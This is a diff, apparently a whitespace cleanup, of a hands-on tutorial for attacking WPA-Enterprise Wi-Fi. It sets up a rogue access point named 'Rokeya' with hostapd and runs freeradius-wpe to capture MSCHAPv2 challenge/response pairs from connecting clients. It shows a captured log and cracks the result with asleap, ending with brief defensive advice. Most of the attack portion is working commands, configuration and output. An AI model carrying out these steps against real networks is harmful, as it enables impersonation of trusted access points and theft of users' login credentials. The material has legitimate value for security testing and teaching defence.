@@ -1,11 +1,11 @@
 
 
 ... trying to abuse wpa-enterprise which is using freeradius as authentication.
-... 
+...
 ... we will set up an rogue ap of the fake name "Rokeya". and on the web portal
 ... of the ap we will configure wpa-enterprise for the security mode.
 ... and on the EAP(802.1x) section we will put our attackers ip address for the
-... radius server ip address, will set radius server shared secret as "test" and 
+... radius server ip address, will set radius server shared secret as "test" and
 ... enable the mac address authentication.
 
 ... if we dont have any physical access-point to set up then what we can do is
@@ -19,7 +19,7 @@
  # ls
 hostapd.conf  ifupdown.sh
 
- # cat -n hostapd.conf 
+ # cat -n hostapd.conf
 
      1	interface=wlan0
      2	driver=nl80211
@@ -38,15 +38,15 @@ hostapd.conf  ifupdown.sh
     15	wpa_key_mgmt=WPA-EAP
     16	channel=1
     17	wpa_pairwise=TKIP CCMP
-  
+
 
 ... now we will start hostapd
 
- # hostapd /etc/hostapd/hostapd.conf 
+ # hostapd /etc/hostapd/hostapd.conf
 
 ... this will create one ap of name Rokeya. note the hostapd.conf file it is pointing
-... the authentication server as it self 127.0.0.1. for eap hacking testing we can 
-... install the following. 
+... the authentication server as it self 127.0.0.1. for eap hacking testing we can
+... install the following.
 
 ... installing freeradius-wpe and configuring it.
 
@@ -58,7 +58,7 @@ hostapd.conf  ifupdown.sh
 
  # cd /usr/local/etc/raddb/certs/
  # ./bootstrap
- 
+
 ... now run the radius server
 
  # radiusd -v
@@ -71,7 +71,7 @@ You may redistribute copies of FreeRADIUS under the terms of the
 GNU General Public License.
 For more information about these matters, see the file named COPYRIGHT
 
-... so our freeradius-wpe installation has been complete. now we will configure it 
+... so our freeradius-wpe installation has been complete. now we will configure it
 ... as our requirement. we will just set the default_eap_type=peap in eap.conf file
 ... list below and leave the rest of the file as it is.
 
@@ -89,14 +89,14 @@ client 192.168.1.0/24 {
 }
 
 ... now we will start the radius like below.
- 
+
  # radiusd -s -X
- 
-... if you find the following error then just make sure the radiusd directory is 
-... present on /usr/local/var/run. if not then make radiusd directory with the 
+
+... if you find the following error then just make sure the radiusd directory is
+... present on /usr/local/var/run. if not then make radiusd directory with the
 ... mkdir command.
 
-Failed binding to /usr/local/var/run/radiusd/radiusd.sock: No such file or directory 
+Failed binding to /usr/local/var/run/radiusd/radiusd.sock: No such file or directory
 
 ... we may also include the "with_ntdomain_hack = yes" line in the module/mschap file
 
@@ -104,12 +104,12 @@ Failed binding to /usr/local/var/run/radiusd/radiusd.sock: No such file or direc
 ... any windows client is trying to connect. if so we will get output similar like
 ... following
 
- # tail -f /usr/local/var/log/radius/freeradius-server-wpe.log 
+ # tail -f /usr/local/var/log/radius/freeradius-server-wpe.log
 
 username: test
 challenge: 1b:0a:dd:d9:e6:50:5c:e7
 response: de:f3:a8:1f:7e:3c:43:db:04:f8:a0:75:ce:53:53:ca:70:35:71:76:2d:0c:e6:b5
-   
+
 ... now to conduct one dictionary attack on this we can use the tools asleap coming
 ... with kali/backtrack like below.
 
@@ -127,7 +127,3 @@ response: de:f3:a8:1f:7e:3c:43:db:04:f8:a0:75:ce:53:53:ca:70:35:71:76:2d:0c:e6:b
 ... certificate validation is turned on, the right certifying authorities are chosen, the
 ... radius servers that are authorized are used and finally any setting that allows users
 ... to accept new Radius servers, certificates, or certifying authorities is turned off.
-
-
-
-
